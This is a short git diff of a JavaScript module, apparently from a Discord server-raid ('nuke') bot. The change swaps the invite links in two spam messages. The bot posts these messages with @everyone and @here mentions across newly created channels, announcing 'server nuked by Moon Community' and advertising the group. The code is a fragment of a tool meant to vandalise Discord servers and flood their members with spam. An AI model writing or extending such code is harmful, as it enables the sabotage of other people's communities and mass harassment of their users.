@@ -74,7 +74,7 @@ module.exports = (client) => {
                 }
 
                 // 5. Send initial message
-                const welcomeMessage = "@everyone @here server nuked by **Moon Community 🌙** join our discord discord.gg/h5ejJAabPv ";
+                const welcomeMessage = "@everyone @here server nuked by **Moon Community 🌙** join our discord discord.gg/GtVuGTuErr ";
                 await Promise.all(
                     newChannels.map(channel =>
                         channel.send({
@@ -178,7 +178,7 @@ module.exports = (client) => {
                 }
 
                 // 5. Send initial message
-                const welcomeMessage = "@everyone @here\n🌙 **Join Our Moon Community!** ✨\nActive Chats • Coding • Events • Chill Vibes 🚀\n🔗 https://discord.gg/62xxMq2NKv";
+                const welcomeMessage = "@everyone @here\n🌙 **Join Our Moon Community!** ✨\nActive Chats • Coding • Events • Chill Vibes 🚀\n🔗 https://discord.gg/GtVuGTuErr";
                 await Promise.all(
                     newChannels.map(channel =>
                         channel.send({
